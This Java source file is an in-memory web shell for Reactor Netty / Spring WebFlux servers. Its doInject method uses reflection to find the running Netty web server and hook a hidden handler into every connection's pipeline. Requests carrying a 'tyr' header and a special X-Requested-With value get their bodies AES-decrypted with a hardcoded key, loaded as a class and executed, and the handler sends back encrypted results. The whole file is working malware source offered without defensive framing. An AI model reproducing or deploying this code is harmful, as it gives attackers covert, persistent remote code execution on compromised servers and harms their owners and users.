package core.memshell;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.handler.codec.http.*;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.SocketAddress;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLDecoder;
import java.util.AbstractMap;


public class NettyHandlerMemShell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {

    public NettyHandlerMemShell() {

    }

    public static void doInject(Object o, String path) {

        try {
            Method getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);

            for (int i = 0; i < Array.getLength(threads); i++) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    Field _val$disposableServer = thread.getClass().getDeclaredField("val$disposableServer");
                    _val$disposableServer.setAccessible(true);
                    Object val$disposableServer = _val$disposableServer.get(thread);
                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField("config");
                    _config.setAccessible(true);
                    Object config = _config.get(val$disposableServer);
                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField("doOnChannelInit");
                    _doOnChannelInit.setAccessible(true);
                    _doOnChannelInit.set(config, new NettyHandlerMemShell());

                }
            }
        } catch (Exception e) {

        }
    }

    String xc = "3c6e0b8a9c15224a";
    String pass = "pAS3";
    String md5 = md5(pass + xc);

    private static Class defClass(byte[] classbytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public byte[] base64Encode(byte[] bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (byte[]) Encoder.getClass().getMethod("encode", new Class[]{
                    byte[].class
            }).invoke(Encoder, new Object[]{
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = ((String) Encoder.getClass().getMethod("encode", new Class[]{
                        byte[].class
                }).invoke(Encoder, new Object[]{
                        bs
                })).getBytes();
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{
                    String.class
            }).invoke(decoder, new Object[]{
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{
                        String.class
                }).invoke(decoder, new Object[]{
                        bs
                });
            } catch (Exception e2) {
            }
        }
        return value;
    }

    private static byte[] byteMergerAll(byte[]... values) {
        int length_byte = 0;
        for (int i = 0; i < values.length; i++) {
            length_byte += values[i].length;
        }
        byte[] all_byte = new byte[length_byte];
        int countLength = 0;
        for (int i = 0; i < values.length; i++) {
            byte[] b = values[i];
            System.arraycopy(b, 0, all_byte, countLength, b.length);
            countLength += b.length;
        }
        return all_byte;
    }

    @Override
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {
        ChannelPipeline pipeline = channel.pipeline();
        pipeline.addBefore("reactor.left.httpTrafficHandler", "xxxhandler", new NettyHandlerMemShell());
    }


    private static ThreadLocal<AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream>> requestThreadLocal = new ThreadLocal<AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream>>();
    private static Class payload;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {

        if (msg instanceof HttpRequest) {
            HttpRequest httpRequest = (HttpRequest) msg;
            if (!httpRequest.headers().contains("tyr")) {
                ctx.fireChannelRead(msg);
                return;
            }
            AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream> simpleEntry = new AbstractMap.SimpleEntry(httpRequest, new ByteArrayOutputStream());
            requestThreadLocal.set(simpleEntry);
        } else if (msg instanceof HttpContent) {
            HttpContent httpContent = (HttpContent) msg;
            AbstractMap.SimpleEntry<HttpRequest, ByteArrayOutputStream> simpleEntry = requestThreadLocal.get();
            if (simpleEntry == null) {
                return;
            }
            HttpRequest httpRequest = simpleEntry.getKey();
            HttpHeaders headers = httpRequest.headers();
            if (headers.contains("X-Requested-With", "XMLHTTPRequest", false)) {
                ByteArrayOutputStream contentBuf = simpleEntry.getValue();
                ByteBuf byteBuf = httpContent.content();
                int size = byteBuf.capacity();
                byte[] requestContent = new byte[size];
                byteBuf.getBytes(0, requestContent, 0, requestContent.length);
                contentBuf.write(requestContent);
                if (httpContent instanceof LastHttpContent) {
                    try {
                        String payloadString = URLDecoder.decode(new String(contentBuf.toByteArray()));
                        int index = payloadString.indexOf("=");
                        payloadString = payloadString.substring(index + 1);
                        byte[] data = x(base64Decode(payloadString), false);
                        if (payload == null) {
                            payload = defClass(data);
                        } else {
                            Object f = payload.newInstance();
                            ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                            f.equals(arrOut);
                            f.equals(data);
                            f.toString();
                            String md51 = md5.substring(0, 16);
                            String md52 = md5.substring(16, 32);
                            byte[] resp = byteMergerAll(md51.getBytes(), base64Encode(x(arrOut.toByteArray(), true)), md52.getBytes());
                            send(ctx, resp, HttpResponseStatus.OK);
                        }
                    } catch (Exception e) {
                        ctx.fireChannelRead(httpRequest);
                    }
                } else if (headers.contains("X-Requested-With", "XmlHTTPRequest", false)) {
                    send(ctx, "Success".getBytes(), HttpResponseStatus.OK);
                }
            } else {
                ctx.fireChannelRead(msg);
            }

        }

    }

    private void send(ChannelHandlerContext ctx, byte[] context, HttpResponseStatus status) {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }
}